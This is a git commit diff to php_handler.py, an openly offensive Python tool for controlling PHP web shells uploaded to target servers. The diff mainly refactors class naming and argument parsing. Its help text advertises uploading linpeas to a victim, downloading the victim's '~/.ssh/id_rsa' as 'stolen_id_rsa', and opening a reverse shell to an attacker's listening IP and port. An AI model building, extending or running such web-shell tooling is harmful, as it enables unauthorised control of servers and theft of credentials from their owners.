176fa09442f3443b4fe12137900097214741990e
Mitchell Kettlewell <watchdog2000@protonmail.com>
2021-03-30 22:00:44 +0100

    sorry, I'm indecisive and decided to work more on this and add more... Better handling of php_get_param in classes constructor

--- php_handler.py
+++ php_handler.py
@@ -8,10 +8,10 @@ import argparse
 basepath = os.path.dirname(os.path.abspath(__file__))
 
 
-class PHP_Shell_Handler:
-    def __init__(self, webshell_url, webshell_get_param="phpshellcmd", encoded=True):
+class PHP_Web_Shell_Handler:
+    def __init__(self, webshell_url, webshell_get_param=None, encoded=True):
         try:
-            web_utils.validate_url(webshell_url)
+            webshell_url = web_utils.validate_url(webshell_url)
         except web_utils.InvalidUrlError:
             print(f"[-] - The provided url: '{webshell_url} does not seem to be a valid url'")
             sys.exit(0)
@@ -20,6 +20,8 @@ class PHP_Shell_Handler:
             sys.exit(1)
 
         self.webshell_url = webshell_url
+        if not webshell_get_param:
+            webshell_get_param = "phpshellcmd"
         self.webshell_get_param = webshell_get_param
         self.encoded = encoded
     
@@ -66,11 +68,11 @@ class PHP_Shell_Handler:
             "\tEXAMPLE: upload /opt/linpeas.sh /tmp/linpeas.sh")
         print("\n\t[ DOWNLOAD ] - 'download remotefilepath localfilepath' - downloads a file from the server, from 'remotefilepath' on the target machine, to 'localfilepath' on your machine\n" +
             "\tEXAMPLE: download /home/user/.ssh/id_rsa /home/watchdog/stolen_id_rsa")
-        print("\n\t[ SWITCHSHELL ] - 'switchshell current_shellfile new_shellfile' - switches the file currently used by the shell handler to a new file (often for switching between encoded and non encoded shells)\n" +
+        print("\n\t[ SWITCHSHELL ] - 'switchshell current_shellfile new_shellfile' - switches the file currently used by the shell handler to a new file (often used for switching between encoded and non encoded shells)\n" +
             "\tEXAMPLE: switchshell /path/to/shell.php /path/to/newshell.php")
         print("\n\t[ SHELL ] - 'shell listening_ip listening_port' - attempts to run a reverse shell to give shell access to listening_ip on listening_port\n" +
             "\tEXAMPLE: shell 10.10.10.10 9001")
-        print("\n\t[ QUIT (or EXIT) ] - 'quit' - quits the current session and exits the program (also works with 'exit')")
+        print("\n\t[ QUIT (or EXIT) ] - 'quit' - quits the current session and exits the program (also works with 'exit')\n")
 
     def shell(self):
         shell_filename = basepath +"/phpshells/shell.php"
@@ -113,7 +115,7 @@ class PHP_Shell_Handler:
 def main():
     arg_parser = argparse.ArgumentParser(description="Python based tool to interact with php web shells!")
     arg_parser.add_argument("-u", "--url", help=f"The URL location that your web shell will be uploaded to", required=True)
-    arg_parser.add_argument("-p", "--phpparam", help=f"The name of the php get parameter in the php file uploaded (default of 'phpgetshell' is used with the built in php shells that are suggested to use")
+    arg_parser.add_argument("-p", "--param", help=f"The name of the php get parameter used in the php file uploaded (default of 'phpshellcmd' is used with the built in php shells that are suggested to be used")
     arg_parser.add_argument("--encoded", help=f"Decide whether communication with the shell will be encoded or not (default is not encoded)", nargs='*')
 
     args = arg_parser.parse_args()
@@ -121,18 +123,14 @@ def main():
     url = args.url
 
     php_param_name = None
-    if args.phpparam:
-        php_param_name = args.phpparam
+    if args.param:
+        php_param_name = args.param
 
     encoded = False
     if args.encoded != None:
         encoded = True
 
-    if php_param_name:
-        handler = PHP_Shell_Handler(url, encoded=encoded, webshell_get_param=php_param_name)
-    else:
-        handler = PHP_Shell_Handler(url, encoded=encoded)
-        
+    handler = PHP_Web_Shell_Handler(url, encoded=encoded, webshell_get_param=php_param_name)    
     handler.shell()
 
 
